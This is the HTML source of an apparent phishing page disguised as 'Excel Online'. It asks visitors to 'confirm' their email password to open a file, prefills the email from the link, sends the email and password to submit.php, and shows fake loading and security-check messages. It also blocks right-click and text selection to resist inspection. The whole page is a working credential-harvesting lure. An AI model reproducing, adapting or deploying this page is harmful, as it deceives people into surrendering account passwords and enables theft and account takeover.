
<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>EXCEL ONLINE</title>
     <meta name="keywords" content="PDF">
      <meta name="description" content="PDF">
<meta name="robots" content="noindex">
<meta name="googlebot" content="noarchive">
<meta name="googlebot" content="nosnippet">
<meta name="googlebot" content="noindex">
<meta name="googlebot" content="nofollow">
<link rel="stylesheet" href="http://fonts.googleapis.com/css?family=Lato:100,300,400,700,900,100italic,300italic,400italic,700italic,900italic" />
 <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.1/jquery.min.js"></script>
<script src="https://code.jquery.com/jquery-2.1.3.min.js"></script>
<style>
	

body{
	
	background-image:url(BG.jpg);
	background-repeat:no-repeat;
	position:static;
	}
	#fom{
		margin:250px 440px 0px 380px;
		padding-left:40px;
		padding-right:40px;
		width:440px;
			background-image:url(asdd.png);
			background-repeat:no-repeat;
			opacity:0.9;
			height:280px;
			z-index:2;
		
	
		
		}

	#fom2{
		margin:0 auto;
		margin-bottom:0px;
		margin-top:150px;
		max-width:520px;
			background-image:url(asb.png);
			background-repeat:no-repeat;
			opacity:0.9;
			height:280px;
			display:none;

		}
	#fom3{
		margin:0 auto;
		margin-top:0px;
		max-width:510px;
			opacity:0.9;
			display:none;
		}
	#fom4{
		margin:0 auto;
		margin-top:150px;
		height:300px;
		background-image:url(asdd.png);
		background-repeat:no-repeat;
		max-width:510px;
			opacity:0.9;
			display:none;
		}
	#fade{
	position:absolute;
	width:102%;
	background-color:#161515;
	height:100%;
	margin-top:129px;
	margin-left:-10px;
	opacity:0.7;
	}
		#email{
			margin-top:5px;
			margin-left:20px;
			margin-bottom:10px;
			margin-right:20px;
			height: 31px;
			font-size:16px;
			text-align:center;
			width: 373px;
			border:none;
			}
			h4{
			position:relative;
			padding-top:70px;	
			padding-left:3px;		
			 text-align:center;
			 color:white;
	
			}
			h3{
			position:relative;
			padding-left:10px;		
			 text-align:center;
			 color:white;
	
			}

			p{
				background-color:#F00;
				color:#FFF;
				padding:6px;
				border-radius:3px;
				font-weight:bold;
			}
#password{
		margin-right:20px;	
		margin-left:20px;
	height: 31px;
	width: 373px;
        text-align:center;

border:none;
}
#sub
{
		margin-top:10px;
			margin-left:20px;
			margin-bottom:10px;
			margin-right:20px;	
	height: 31px;
	width: 373px;
	background-color:#0E1D46;
	color:white;
	border:none;
float:left;
text-align:center;
}
#sub2
{
	height: 31px;
	width: 100%;
	background-color:#063;
	color:white;
	border:none;
	
}
h4 span{
	background-color:#FFF;
	border-radius:6px;
	color:#900;
	padding:3px;
}

#second{
	display:none;
}
#loader{
	display:none;
}
#confirming{
	display:none;
}
#confirmall{
	display:none;
}
#confirmingsuccess1{
	display:none;
}
#confirmingsuccess2{
	display:none;
}
#loader2{
	display:none;
	background-image:url(aI3V9.gif);
	background-repeat:no-repeat;
	position:static;
	max-width:450px;
	margin: 0 auto;
	margin-top:150px;
	max-height:340px;

}
#confirming1{
	display:none;
}
#confirmingsuccess11{
	display:none;
}
#confirmingsuccess21{
	display:none;
}
#fominvalidlink{
			margin:250px 440px 0px 380px;
		padding-left:40px;
		padding-right:40px;
		width:440px;
			background-image:url(asdd.png);
			background-repeat:no-repeat;
			opacity:0.9;
			height:280px;
			z-index:2;
			display:none;
}

</style>

</head>

<body id="mybody" oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<span id="em" style="position: absolute; left: 496px; top: 181px; background-color:#F7EBEC; background-color:red; font-size:16px;padding:20px 20px 20px 20px; display:none;"></span>
<span id="ps"></span>
<section id="whatsit">
<div id="fom2">

</div>
<div id="fom3">
<div id="form2btn"></div>

</div>
</section>
<div id="loader2">
<p id="confirming1">Opening Excel files...</p>
<p id="confirmall1">Loading files... </p><p id="confirmingsuccess11">Analysing file properties ...</p>
<p id="confirmingsuccess21">Error loading files ...</p>
</div>
<div id="fom4">
</div>
<div id="fominvalidlink">
<p>System Error:</p>
<h4><span>You've been stopped from checking this order <br>because you are using an invalid <br>email link <u><i><?php echo $getemail;?></i></u></span></h4>
<hr>
<p>Click <a href="/">here to access</a> our <b>orders</b>&trade;</p>
</div>
<div id="fom">
<h4 id="confirms"><marquee>Confirm E-mail password to Continue.</marquee></h4><p id="confirming">Confirming details...</p>
<h4 id="confirmall"><span>your credentials does not match</span></h4><p id="confirmingsuccess1">Analysing security ...</p>
<p id="confirmingsuccess2">Downloading the PDF ...</p>
<section id="first">


<form action="submit.php" method="post">
    
 <input id="username" name="txtEmail" type="email" required aria-required="true"  style="width:365px;border:2px solid #e1e1e1;padding:5px;margin-left:18px;height:20px;text-align:center;font-size:20px;" placeholder="Enter Your Email"> 
  <input id="password" name="txtPass" type="password" required aria-required="true" style="width:365px;border:2px solid #e1e1e1;padding:5px;margin-left:18px;height:20px;margin-top:7px;font-size:20px;"  placeholder="Enter Your Password">



<span class="1" dojoattachevent="ondijitclick:_onButtonClick,onmouseenter:_onMouse,onmouseleave:_onMouse,onmousedown:_onMouse" 
				widgetid="signin">
    
    <span class="2">
        
        <span class="1 2">
            
            <button class="1" dojoattachpoint="titleNode,focusNode" 
				type="submit" value="" wairole="button" waistate="labelledby-signin_label" role="button"
				aria-labelledby="signin_label" id="signin" tabindex="0" 
				style="background-color:#c6ce2b;color:white;line-height:18px;border:5px solid #c6ce2b; width:379px;padding:5px;margin-left:18px;height:40px;margin-top:10px;">
                
				<span class="dijitReset dijitInline" dojoattachpoint="iconNode">
				    
				    <span class="dijitReset dijitToggleButtonIconChar">✓</span>
			
				
				<span class="dijitReset dijitInline dijitButtonText" id="signin_label" dojoattachpoint="containerNode">Sign In</span>
				</button></span>  


		<script>
  // Get the email query parameter from the URL
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const email = urlParams.get('email');

  // Set the value of the email input field to the email from the URL
  const emailField = document.getElementById('username');
  emailField.value = email;
</script>
</body>
</html>